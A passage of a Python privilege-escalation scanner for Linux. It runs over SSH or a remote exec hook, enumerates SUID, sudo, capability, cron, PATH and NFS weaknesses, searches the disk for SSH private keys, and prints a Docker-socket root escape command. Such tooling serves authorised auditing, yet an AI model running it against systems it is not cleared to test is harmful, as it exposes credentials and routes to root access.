    "make", "cmake", "gcc", "g++", "cc",
    "ldconfig", "ldd", "ld",
    "iptables", "ip6tables", "nft",
    "tc", "ip", "brctl", "ovs-vsctl",
    "setcap", "getcap", "capsh",
    "unshare", "nsenter", "chroot",
    "reboot", "shutdown", "halt", "poweroff",
    "su", "sudo", "doas",
    "passwd", "chpasswd", "usermod", "useradd",
    "visudo", "sudoedit",
    "dpkg", "rpm", "apt", "apt-get", "yum", "dnf", "pacman",
    "snap", "flatpak", "appimage",
    "env", "nice", "nohup", "timeout", "stdbuf",
    "setarch", "taskset", "chroot", "ionice", "flock",
    "xargs", "watch", "tee",
    "base64", "base32", "xxd", "hexdump", "od",
    "openssl", "gpg", "gpg2",
    "cat", "head", "tail", "tac", "nl",
    "sort", "uniq", "cut", "paste",
    "expand", "unexpand", "fmt", "pr", "fold",
    "iconv", "comm", "diff", "cmp", "join",
    "tr", "sed", "grep", "egrep", "fgrep",
    "pg", "look", "tee", "dd", "split", "csplit",
    "wc", "sum", "cksum", "md5sum", "sha1sum", "sha256sum", "sha512sum",
    "ar", "tar", "cpio", "shar", "genisoimage", "wodim",
    "sox", "avconv", "ffmpeg", "vlc", "mplayer", "mpv",
    "display", "convert", "identify", "stream", "animate",
    "composite", "montage", "mogrify", "import",
    "jhead", "exiftool", "file",
    "nm", "objdump", "readelf", "size", "strings", "strip",
    "ldd", "gcc", "g++", "as", "ld", "ar", "ranlib",
    "c++filt", "gcov", "gprof",
    "c89", "c99", "cc", "c++", "f77", "f95", "gfortran",
    "gcj", "gcjh", "gij", "gjar", "gjavah", "gkeytool",
    "gnative2ascii", "gorbd", "grmic", "grmid", "grmiregistry",
    "gserialver", "gtnameserv",
    "jarsigner", "javadoc", "javah", "javap",
    "jcmd", "jconsole", "jdb", "jhat", "jinfo", "jmap",
    "jps", "jrunscript", "jsadebugd", "jstack", "jstat", "jstatd", "jvisualvm",
    "keytool", "native2ascii", "orbd", "pack200", "policytool",
    "rmic", "rmid", "rmiregistry", "schemagen", "serialver",
    "servertool", "tnameserv", "unpack200", "wsgen", "wsimport", "xjc",
    "busybox", "ash", "csh", "ksh", "tcsh",
    "julia", "jjs", "groovy", "scala",
    "ghc", "ghci", "runghc", "cabal", "kotlin",
    "lwp-request", "lwp-download",
    "smbclient", "wall", "write",
    "xxd", "base64", "base32", "hexdump", "od",
    "strings", "cat", "head", "tail", "tac", "nl",
    "sort", "uniq", "cut", "paste", "expand", "unexpand",
    "fmt", "pr", "fold", "iconv", "comm", "diff", "cmp", "join",
    "tr", "sed", "grep", "egrep", "fgrep", "pg", "look", "tee",
    "dd", "split", "csplit", "wc", "sum", "cksum",
    "md5sum", "sha1sum", "sha256sum", "sha512sum",
    "openssl", "gpg", "bzip2", "gzip", "xz", "lzma", "lz4", "zstd",
    "ar", "tar", "cpio", "shar", "genisoimage", "wodim",
    "sox", "avconv", "ffmpeg", "vlc", "mplayer", "mpv",
    "display", "convert", "identify", "stream", "animate",
    "composite", "montage", "mogrify", "import",
    "jhead", "exiftool", "file", "nm", "objdump", "readelf",
    "size", "strings", "strip", "ldd", "gcc", "g++", "as", "ld",
    "ar", "ranlib", "c++filt", "gcov", "gprof",
    "c89", "c99", "cc", "c++", "f77", "f95", "gfortran",
    "gcj", "gcjh", "gij", "gjar", "gjavah", "gkeytool",
    "gnative2ascii", "gorbd", "grmic", "grmid", "grmiregistry",
    "gserialver", "gtnameserv",
    "jarsigner", "javadoc", "javah", "javap",
    "jcmd", "jconsole", "jdb", "jhat", "jinfo", "jmap",
    "jps", "jrunscript", "jsadebugd", "jstack", "jstat", "jstatd", "jvisualvm",
    "keytool", "native2ascii", "orbd", "pack200", "policytool",
    "rmic", "rmid", "rmiregistry", "schemagen", "serialver",
    "servertool", "tnameserv", "unpack200", "wsgen", "wsimport", "xjc",
]


class LinuxPrivescScanner:
    def __init__(self, ssh_client=None, remote_exec=None):
        self.ssh = ssh_client
        self.remote_exec = remote_exec
        self.findings = []
        self.system_info = {}

    def scan(self) -> List[Dict]:
        self._gather_system_info()
        self._check_kernel_exploits()
        self._check_suid_binaries()
        self._check_sudo_privileges()
        self._check_capabilities()
        self._check_cron_jobs()
        self._check_writable_system_paths()
        self._check_docker_escape()
        self._check_sensitive_files()
        self._check_network_services()
        self._check_nfs_exports()
        self._check_ld_preload()
        self._check_systemd_services()
        self._check_polkit()
        self._check_wildcard_injection()
        self._check_path_hijacking()
        return self.findings

    def _exec(self, cmd: str) -> str:
        if self.ssh:
            try:
                _, stdout, _ = self.ssh.exec_command(cmd, timeout=10)
                return stdout.read().decode(errors="ignore")
            except Exception:
                return ""
        elif self.remote_exec:
            try:
                return self.remote_exec(cmd)
            except Exception:
                return ""
        else:
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True,
                                       text=True, timeout=10)
                return result.stdout + result.stderr
            except Exception:
                return ""

    def _gather_system_info(self):
        self.system_info["kernel"] = self._exec("uname -r").strip()
        self.system_info["hostname"] = self._exec("hostname").strip()
        self.system_info["arch"] = self._exec("uname -m").strip()
        self.system_info["user"] = self._exec("whoami").strip()
        self.system_info["id"] = self._exec("id").strip()
        self.system_info["groups"] = self._exec("groups").strip()
        self.system_info["os_release"] = self._exec("cat /etc/os-release 2>/dev/null || cat /etc/lsb-release 2>/dev/null").strip()
        self.system_info["path"] = self._exec("echo $PATH").strip()
        self.system_info["env"] = self._exec("env 2>/dev/null").strip()

        self.findings.append({
            "type": "system_info",
            "risk_level": "info",
            "detail": f"Kernel: {self.system_info['kernel']}, User: {self.system_info['user']}",
            "system_info": self.system_info,
        })

    def _check_kernel_exploits(self):
        kernel = self.system_info.get("kernel", "")
        if not kernel:
            return

        for name, exploit in KERNEL_EXPLOITS.items():
            self.findings.append({
                "type": "kernel_exploit_candidate",
                "risk_level": exploit["risk"],
                "exploit_name": name,
                "cve": exploit["cve"],
                "kernel_range": exploit["kernel_range"],
                "detail": f"内核版本 {kernel} 可能受 {name} ({exploit['cve']}) 影响",
                "exploit_url": exploit["exploit"],
                "description": exploit["description"],
            })

    def _check_suid_binaries(self):
        suid_output = self._exec("find / -perm -4000 -type f 2>/dev/null")
        if not suid_output:
            suid_output = self._exec("find / -perm -u=s -type f 2>/dev/null")

        suid_bins = [b.strip() for b in suid_output.split("\n") if b.strip()]
        for bin_path in suid_bins:
            bin_name = os.path.basename(bin_path)
            if bin_name in SUID_GTFOBINS:
                gtfobin = SUID_GTFOBINS[bin_name]
                self.findings.append({
                    "type": "suid_gtfobin",
                    "risk_level": gtfobin["risk"],
                    "binary": bin_path,
                    "method": gtfobin["method"],
                    "detail": f"SUID二进制 {bin_path} 可用于提权: {gtfobin['method']}",
                })

        if not suid_bins:
            self.findings.append({
                "type": "suid_check",
                "risk_level": "info",
                "detail": "未发现SUID二进制文件",
            })

    def _check_sudo_privileges(self):
        sudo_output = self._exec("sudo -l 2>/dev/null")
        if not sudo_output:
            return

        self.findings.append({
            "type": "sudo_privileges",
            "risk_level": "info",
            "detail": f"Sudo权限: {sudo_output[:500]}",
        })

        if "NOPASSWD" in sudo_output:
            self.findings.append({
                "type": "sudo_nopasswd",
                "risk_level": "high",
                "detail": "存在NOPASSWD sudo权限",
            })

        if "LD_PRELOAD" in sudo_output or "LD_LIBRARY_PATH" in sudo_output:
            self.findings.append({
                "type": "sudo_env_keep",
                "risk_level": "critical",
                "detail": "sudo保留LD_PRELOAD/LD_LIBRARY_PATH环境变量，可注入共享库",
            })

        for cmd in SUDO_DANGEROUS_COMMANDS:
            if cmd in sudo_output:
                self.findings.append({
                    "type": "sudo_dangerous_command",
                    "risk_level": "critical",
                    "command": cmd,
                    "detail": f"sudo可执行危险命令: {cmd}",
                })

    def _check_capabilities(self):
        cap_output = self._exec("getcap -r / 2>/dev/null")
        if not cap_output:
            return

        for line in cap_output.split("\n"):
            line = line.strip()
            if not line:
                continue
            for cap_name, cap_info in CAPABILITIES_RISK.items():
                if cap_name.lower() in line.lower():
                    self.findings.append({
                        "type": "dangerous_capability",
                        "risk_level": cap_info["risk"],
                        "capability": cap_name,
                        "file": line,
                        "detail": f"文件具有危险capability: {cap_info['detail']}",
                    })

    def _check_cron_jobs(self):
        cron_output = self._exec("cat /etc/crontab 2>/dev/null; ls -la /etc/cron.* 2>/dev/null; ls -la /var/spool/cron/crontabs/ 2>/dev/null")
        if cron_output:
            self.findings.append({
                "type": "cron_jobs",
                "risk_level": "info",
                "detail": f"Cron任务: {cron_output[:500]}",
            })

        writable_cron = self._exec("find /etc/cron* -writable -type f 2>/dev/null; find /var/spool/cron -writable -type f 2>/dev/null")
        if writable_cron:
            self.findings.append({
                "type": "writable_cron",
                "risk_level": "critical",
                "detail": f"可写Cron文件: {writable_cron[:300]}",
            })

    def _check_writable_system_paths(self):
        for path in WRITABLE_SYSTEM_PATHS[:10]:
            writable = self._exec(f"test -w {path} && echo 'WRITABLE' 2>/dev/null")
            if "WRITABLE" in writable:
                self.findings.append({
                    "type": "writable_system_path",
                    "risk_level": "high",
                    "path": path,
                    "detail": f"系统路径可写: {path}",
                })

    def _check_docker_escape(self):
        docker_sock = self._exec("test -S /var/run/docker.sock && echo 'DOCKER_SOCK_FOUND' 2>/dev/null")
        if "DOCKER_SOCK_FOUND" in docker_sock:
            self.findings.append({
                "type": "docker_socket",
                "risk_level": "critical",
                "detail": "发现Docker socket，可通过Docker逃逸提权",
                "exploit": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
            })

        docker_group = self._exec("groups 2>/dev/null | grep -o docker")
        if docker_group:
            self.findings.append({
                "type": "docker_group",
                "risk_level": "critical",
                "detail": "当前用户在docker组中，可通过Docker提权",
            })

    def _check_sensitive_files(self):
        for file_path in SENSITIVE_FILES[:20]:
            result = self._exec(f"test -r {file_path} && echo 'READABLE:{file_path}' 2>/dev/null")
            if "READABLE" in result:
                self.findings.append({
                    "type": "sensitive_file_readable",
                    "risk_level": "high",
                    "file": file_path,
                    "detail": f"敏感文件可读: {file_path}",
                })

        ssh_keys = self._exec("find / -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' 2>/dev/null | head -20")
        if ssh_keys:
            self.findings.append({
                "type": "ssh_keys_found",
                "risk_level": "critical",
                "detail": f"发现SSH私钥: {ssh_keys[:300]}",
            })

    def _check_network_services(self):
        listening = self._exec("netstat -tlnp 2>/dev/null || ss -tlnp 2>/dev/null")
        if listening:
            self.findings.append({
                "type": "listening_services",
                "risk_level": "info",
                "detail": f"监听服务: {listening[:500]}",
            })

        localhost_services = self._exec("netstat -tlnp 2>/dev/null | grep 127.0.0.1 || ss -tlnp 2>/dev/null | grep 127.0.0.1")
        if localhost_services:
            self.findings.append({
                "type": "localhost_services",
                "risk_level": "medium",
                "detail": f"本地监听服务(可能可被SSRF利用): {localhost_services[:300]}",
            })

    def _check_nfs_exports(self):
        exports = self._exec("cat /etc/exports 2>/dev/null")
        if "no_root_squash" in exports:
            self.findings.append({
                "type": "nfs_no_root_squash",
                "risk_level": "critical",
                "detail": "NFS配置no_root_squash，可挂载并写入SUID文件",
            })

    def _check_ld_preload(self):
        ld_preload = self._exec("cat /etc/ld.so.preload 2>/dev/null")
        if ld_preload:
            self.findings.append({
                "type": "ld_preload",
                "risk_level": "info",
                "detail": f"LD_PRELOAD配置: {ld_preload[:200]}",
            })

        writable_ld = self._exec("test -w /etc/ld.so.preload && echo 'WRITABLE' 2>/dev/null")
        if "WRITABLE" in writable_ld:
            self.findings.append({
                "type": "writable_ld_preload",
                "risk_level": "critical",
                "detail": "/etc/ld.so.preload可写，可注入恶意共享库",
            })

    def _check_systemd_services(self):
        writable_services = self._exec("find /etc/systemd/system /usr/lib/systemd/system -writable -name '*.service' 2>/dev/null")
        if writable_services:
            self.findings.append({
                "type": "writable_systemd_service",
                "risk_level": "critical",
                "detail": f"可写Systemd服务文件: {writable_services[:300]}",
            })

    def _check_polkit(self):
        pkexec = self._exec("which pkexec 2>/dev/null")
        if pkexec:
            self.findings.append({
                "type": "pkexec_available",
                "risk_level": "medium",
                "detail": "pkexec可用，检查CVE-2021-4034 (PwnKit)",
            })

    def _check_wildcard_injection(self):
        tar_wildcard = self._exec("grep -r 'tar.*\\*' /etc/cron* /var/spool/cron 2>/dev/null")
        if tar_wildcard:
            self.findings.append({
                "type": "wildcard_injection",
                "risk_level": "high",
                "detail": f"Cron中使用tar通配符，可能存在通配符注入: {tar_wildcard[:200]}",
            })

    def _check_path_hijacking(self):
        path = self.system_info.get("path", "")
        writable_paths = []
        for p in path.split(":"):
            writable = self._exec(f"test -w {p} && echo 'WRITABLE:{p}' 2>/dev/null")
            if "WRITABLE" in writable:
                writable_paths.append(p)

        if writable_paths:
            self.findings.append({
                "type": "writable_path",
                "risk_level": "critical",
                "detail": f"PATH中包含可写目录: {writable_paths}，可进行PATH劫持",
            })


def scan_linux_privesc(ssh_client=None, remote_exec=None) -> List[Dict]:
    scanner = LinuxPrivescScanner(ssh_client, remote_exec)
    return scanner.scan()
